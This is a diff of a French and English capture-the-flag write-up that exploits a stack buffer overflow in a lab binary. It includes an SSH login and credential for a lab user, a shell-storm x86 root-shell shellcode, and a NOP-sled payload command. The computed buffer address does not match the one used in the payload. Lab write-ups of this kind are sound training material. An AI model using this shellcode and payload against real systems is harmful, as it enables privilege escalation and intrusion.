@@ -1,9 +1,38 @@
-* Insert shell code in our comman
-We can use the website https://shell-storm.org/shellcode/index.html to get a shellcode.
-This one works https://shell-storm.org/shellcode/files/shellcode-516.html.
-\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+# Writeup4
+
+## Insertion du SHELLCODE dans notre commande
 
 Create the payload
 The payload consists in padding + buffer address + NOP + shellcode.
 What is NOP ? It stands for "No Operations", basically it is used to make sure that our exploit doesn’t fail,because we won’t always point to the right address , so we add stuff that doesn’t do anything.
 So with that our shellcode is python -c 'print("\x90" * 140 + "\xb0\xf6\xff\xbf" + "\x90" * 100 + "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'
+
+
+### 1. Connexion à l'utilisateur ZAZ
+* `ssh zaz@192.168.56.101`
+
+* zaz:646da671ca01bb5d84dbb5fb2238dc8e
+
+
+### 2. SHELLCODE 
+
+* On recupere un shell code sur shell-storm, cf RAINFALL
+
+"\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
+
+ 
+### 3. Payload 
+* "[ PADDING NOP POUR BUFFER OVERFLOW] + [ADRESSE DU BUFFER] + [PADDING NOP] + [SHELLCODE ]"
+
+En little endian : 0xbffff8b8 = \xb8\xf8\xff\xbf 
+
+```sh
+
+./exploit_me $(python -c 'print("\x90" * 140 + "\xb0\xf6\xff\xbf" + "\x90" * 100 + "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
+```
+
+
+* https://beta.hackndo.com/buffer-overflow/
+* https://shell-storm.org/shellcode/index.html 
+* https://shell-storm.org/shellcode/files/shellcode-516.html.
